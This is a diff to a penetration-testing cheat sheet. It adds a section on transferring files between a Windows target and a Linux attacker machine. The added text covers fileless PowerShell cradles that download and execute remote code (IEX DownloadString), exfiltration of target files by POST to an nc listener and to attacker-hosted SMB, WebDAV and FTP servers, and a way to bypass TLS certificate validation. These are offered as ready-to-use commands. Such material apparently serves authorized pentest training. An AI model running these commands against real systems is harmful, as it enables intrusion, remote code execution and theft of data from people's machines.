@@ -101,7 +101,12 @@
     - `4.4.2` Bind shells
     - `4.4.3` Web shells
     - `4.4.4` TTY upgrade
-    - `4.4.5` Base64 file transfer
+  - `4.5` **File Transfer (Windows ⇄ Linux)**
+    - `4.5.1` Base64 encode/decode
+    - `4.5.2` PowerShell web (HTTP/HTTPS)
+    - `4.5.3` SMB (TCP/445)
+    - `4.5.4` WebDAV (SMB over HTTP)
+    - `4.5.5` FTP (TCP/21)
 - `5` **Active Directory Enumeration**
   - `5.1` ldapdomaindump
   - `5.2` BloodHound
@@ -2265,18 +2270,34 @@ stty rows <ROWS> columns <COLS>
 
 </details>
 
-#### 4.4.5 Base64 file transfer
+### 4.5 File Transfer (Windows ⇄ Linux)
 
-**Encode on attacker machine:**
+Every method works both directions — download (Windows target pulls a file from the Linux attacker) and upload (Windows target pushes a file back). Choose by what egress the target allows (HTTP/HTTPS is almost always out; SMB 445 is commonly blocked, in which case use WebDAV) and by the shell you hold (non-interactive shells need command files or PowerShell one-liners rather than interactive prompts).
+
+#### 4.5.1 Base64 encode/decode
+
+**Download — Linux → Windows:**
 
 ```bash
-base64 <FILE> -w 0
+md5sum id_rsa
+cat id_rsa | base64 -w 0;echo
 ```
 
-**Decode on remote host:**
+```powershell
+[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("..."))
+Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
+```
+
+**Upload — Windows → Linux:**
+
+```powershell
+[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
+```
 
 ```bash
-echo <BASE64_STRING> | base64 -d > <OUTPUT_FILE>
+echo '<b64>' | base64 -d > hosts
+md5sum hosts
 ```
 
 <details>
@@ -2284,9 +2305,252 @@ echo <BASE64_STRING> | base64 -d > <OUTPUT_FILE>
 
 **Description**
 
-- Use when direct download is blocked by firewalls or restricted outbound connectivity.
-- Base64 encoding increases size by ~33%, but works over any shell connection since it's just text.
-- The `-w 0` flag disables line wrapping in the base64 output — ensures a single pastable string.
+- No network involved — pure text over any shell.
+- Download (Linux → Windows): encode a file on the attacker as base64, paste the string into PowerShell on the target, write it back to bytes, and verify the hash matches.
+- Upload (Windows → Linux): base64-encode a target file in PowerShell, paste the string to the attacker, and decode it back to a file.
+
+**Parameters**
+
+- `md5sum` — Computes the MD5 hash of a file on Linux for integrity verification.
+- `base64 -w 0` — Encodes to base64 with line wrapping disabled, producing a single pastable string.
+- `[IO.File]::WriteAllBytes(...)` — Writes a decoded byte array to disk on Windows.
+- `[Convert]::FromBase64String(...)` — Decodes a base64 string into bytes.
+- `Get-FileHash -Algorithm md5` — Computes the MD5 hash of a file on Windows for comparison.
+- `[Convert]::ToBase64String(...)` — Encodes bytes as a base64 string.
+- `Get-Content -Encoding byte` — Reads a file as raw bytes.
+- `base64 -d` — Decodes base64 back to the original file.
+
+**Notes**
+
+- `cmd.exe` has a max string length of 8,191 chars, and web shells may error on very large strings — split large files or switch methods.
+- Base64 adds ~33% size.
+- Always verify the MD5 matches on both ends to confirm integrity.
+
+</details>
+
+#### 4.5.2 PowerShell web (HTTP/HTTPS)
+
+**Download — Linux → Windows:**
+
+```powershell
+(New-Object Net.WebClient).DownloadFile('<URL>','<OUTPUT_FILE>')
+(New-Object Net.WebClient).DownloadFileAsync('<URL>','<OUTPUT_FILE>')
+IEX (New-Object Net.WebClient).DownloadString('<URL>')
+(New-Object Net.WebClient).DownloadString('<URL>') | IEX
+Invoke-WebRequest '<URL>' -OutFile <OUTPUT_FILE>
+```
+
+**Upload — Windows → Linux:**
+
+```bash
+pip3 install uploadserver
+python3 -m uploadserver
+```
+
+```powershell
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+Invoke-FileUpload -Uri http://<ATTACKER_IP>:8000/upload -File <FILE>
+```
+
+```powershell
+$b64 = [System.convert]::ToBase64String((Get-Content <FILE> -Encoding Byte))
+Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64
+```
+
+```bash
+nc -lvnp 8000
+echo '<b64>' | base64 -d -w 0 > <OUT>
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Download (Linux → Windows): pull a file from an attacker-hosted web server using `Net.WebClient` or `Invoke-WebRequest`, or run it filelessly in memory with `DownloadString | IEX`.
+- Upload (Windows → Linux): serve an upload page with Python's `uploadserver` and POST a file with `PSUpload.ps1`, or base64-encode the file and POST it to a `nc` listener.
+- HTTP/HTTPS is almost always permitted outbound, making this the default transfer method.
+
+**Parameters**
+
+- `(New-Object Net.WebClient).DownloadFile('<URL>','<OUTPUT_FILE>')` — Downloads a file to disk (synchronous).
+- `DownloadFileAsync` — Downloads a file to disk asynchronously.
+- `IEX (New-Object Net.WebClient).DownloadString('<URL>')` — Downloads and executes PowerShell code in memory (fileless).
+- `DownloadString(...) | IEX` — Pipe variant of the fileless in-memory cradle.
+- `Invoke-WebRequest '<URL>' -OutFile <FILE>` — Downloads to disk; aliases `iwr`, `curl`, `wget`, but slower.
+- `python3 -m uploadserver` — Serves an upload page at `/upload` on port 8000.
+- `IEX(New-Object Net.WebClient).DownloadString('...PSUpload.ps1')` — Loads the PSUpload.ps1 helper (defines `Invoke-FileUpload`).
+- `Invoke-FileUpload -Uri ... -File <FILE>` — PSUpload.ps1 helper that POSTs a file to the upload server.
+- `[System.convert]::ToBase64String(...)` / `Get-Content -Encoding Byte` — Base64-encode a file for POSTing.
+- `nc -lvnp 8000` — Captures the POST body on the attacker.
+- `base64 -d -w 0` — Decodes the captured base64 back to a file.
+
+**Notes**
+
+- `Net.WebClient` exposes `OpenRead`, `DownloadData`, `DownloadFile`, `DownloadString` (each sync + async).
+- If the Internet Explorer first-launch config is incomplete the download errors — add `-UseBasicParsing`.
+- Untrusted SSL/TLS cert error — bypass with `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`.
+- Web filtering may block categories, file types (e.g. `.exe`), or non-whitelisted domains.
+- Fileless (`DownloadString | IEX`) never touches disk; `DownloadFile` does.
+- See Harmj0y's PowerShell download cradles list (https://gist.github.com/HarmJ0y/bb48307ffa663256e239) — cradles differ in proxy awareness and disk touch.
+
+</details>
+
+#### 4.5.3 SMB (TCP/445)
+
+```bash
+sudo impacket-smbserver share -smb2support /tmp/smbshare
+sudo impacket-smbserver share -smb2support -user test -password test /tmp/smbshare
+```
+
+**Download — Linux → Windows:**
+
+```cmd
+copy \\<ATTACKER_IP>\share\nc.exe
+net use n: \\<ATTACKER_IP>\share /user:test test
+copy n:\nc.exe
+```
+
+**Upload — Windows → Linux:**
+
+```cmd
+copy <FILE> \\<ATTACKER_IP>\share\
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Attacker hosts an SMB share with `impacket-smbserver`; the Windows target maps or copies to/from it over TCP/445.
+- Download (Linux → Windows): `copy` a file off the attacker's share onto the target.
+- Upload (Windows → Linux): `copy` a file from the target into the attacker's share.
+
+**Parameters**
+
+- `impacket-smbserver <NAME>` — Names the share (e.g. `share`).
+- `-smb2support` — Enables SMB2 (required by modern Windows clients).
+- `-user <USER> -password <PASS>` — Adds an authenticated account to the share (guests are often refused).
+- `copy \\<ATTACKER_IP>\share\<FILE>` — Copies a file from the attacker's share.
+- `net use n: \\<ATTACKER_IP>\share /user:test test` — Mounts the share as drive `n:` with explicit credentials.
+- `copy <FILE> \\<ATTACKER_IP>\share\` — Copies a target file into the attacker's share.
+
+**Notes**
+
+- Modern Windows blocks unauthenticated guest access, so run smbserver with `-user`/`-password` and authenticate with `net use`.
+- SMB (445) is commonly blocked outbound from internal networks, in which case use WebDAV (4.5.4).
+- If `copy \\IP\share\file` errors, mounting with `net use` first usually fixes it.
+
+</details>
+
+#### 4.5.4 WebDAV (SMB over HTTP)
+
+```bash
+sudo pip3 install wsgidav cheroot
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+```
+
+**Target browse:**
+
+```cmd
+dir \\<ATTACKER_IP>\DavWWWRoot
+```
+
+**Upload — Windows → Linux:**
+
+```cmd
+copy <FILE> \\<ATTACKER_IP>\DavWWWRoot\
+copy <FILE> \\<ATTACKER_IP>\sharefolder\
+```
+
+**Download — Linux → Windows:**
+
+```cmd
+copy \\<ATTACKER_IP>\DavWWWRoot\<FILE>
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- WebDAV (RFC 4918) lets a web server act as a file server over HTTP(S), useful when TCP/445 is blocked.
+- Attacker hosts a WebDAV server with `wsgidav`; the Windows target browses and copies to/from it as if it were an SMB share.
+
+**Parameters**
+
+- `wsgidav --host=0.0.0.0 --port=80 --root=/tmp` — Serves the `/tmp` directory over WebDAV on port 80.
+- `--auth=anonymous` — Permits unauthenticated access.
+- `dir \\<ATTACKER_IP>\DavWWWRoot` — Lists the WebDAV root from Windows.
+- `copy <FILE> \\<ATTACKER_IP>\DavWWWRoot\` — Uploads a target file to the WebDAV root.
+- `copy \\<ATTACKER_IP>\DavWWWRoot\<FILE>` — Downloads a file from the WebDAV root.
+
+**Notes**
+
+- `DavWWWRoot` is a special Windows Shell keyword (no such folder actually exists on the server) that tells the Mini-Redirector driver to connect to the WebDAV root; you can skip it by specifying a real folder.
+- Windows first tries SMB, then falls back to HTTP when no SMB share is found.
+- If 445 is open, plain `impacket-smbserver` (4.5.3) is simpler.
+
+</details>
+
+#### 4.5.5 FTP (TCP/21, 20)
+
+```bash
+sudo pip3 install pyftpdlib
+sudo python3 -m pyftpdlib --port 21
+sudo python3 -m pyftpdlib --port 21 --write
+```
+
+**Download — Linux → Windows:**
+
+```powershell
+(New-Object Net.WebClient).DownloadFile('ftp://<ATTACKER_IP>/file.txt','C:\Users\Public\ftp-file.txt')
+```
+
+**Upload — Windows → Linux:**
+
+```powershell
+(New-Object Net.WebClient).UploadFile('ftp://<ATTACKER_IP>/ftp-hosts','C:\Windows\System32\drivers\etc\hosts')
+```
+
+**Non-interactive shells (FTP command file):**
+
+```text
+open <ATTACKER_IP>
+USER anonymous
+binary
+GET <FILE>
+bye
+```
+
+```cmd
+ftp -v -n -s:ftpcommand.txt
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Attacker hosts an FTP server with `pyftpdlib` (anonymous enabled by default).
+- Download (Linux → Windows): the target pulls a file over FTP using `Net.WebClient`.
+- Upload (Windows → Linux): the target pushes a file over FTP using `Net.WebClient.UploadFile`.
+- Non-interactive shells: drive the Windows `ftp` client with a command file (`-s:`) since no interactive prompt is available.
+
+**Parameters**
+
+- `python3 -m pyftpdlib --port 21` — Starts the FTP server on port 21.
+- `--write` — Permits uploads (default is read-only).
+- `(New-Object Net.WebClient).DownloadFile('ftp://...','<OUTPUT>')` — Downloads a file from FTP.
+- `(New-Object Net.WebClient).UploadFile('ftp://...','<FILE>')` — Uploads a file to FTP.
+- `ftp -v -n -s:ftpcommand.txt` — Runs the FTP client non-interactively, reading commands from `ftpcommand.txt`.
+- `GET <FILE>` / `PUT <FILE>` — Download / upload commands inside the FTP command file.
+
+**Notes**
+
+- `pyftpdlib` defaults to port 2121, so pass `--port 21` explicitly.
+- Uploads fail unless the server was started with `--write`.
+- When the shell is non-interactive (no FTP prompt available), drive the FTP client with the `-s:` command file instead.
 
 </details>
 
